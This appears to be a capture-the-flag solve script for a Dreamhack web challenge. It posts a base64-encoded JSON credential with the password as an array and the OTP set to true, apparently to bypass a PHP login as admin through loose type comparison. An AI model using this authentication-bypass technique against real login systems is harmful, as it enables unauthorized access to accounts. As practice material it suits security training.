import requests
import json
import base64

url = 'http://host3.dreamhack.games:17383/index.php'
payload = {
    "id": "admin",
    "pw": ["pw"],
    "otp": True
}
data = {'cred': base64.b64encode(json.dumps(payload).encode()).decode()}
print(data)
resp = requests.post(url, data=data)
print(resp.text)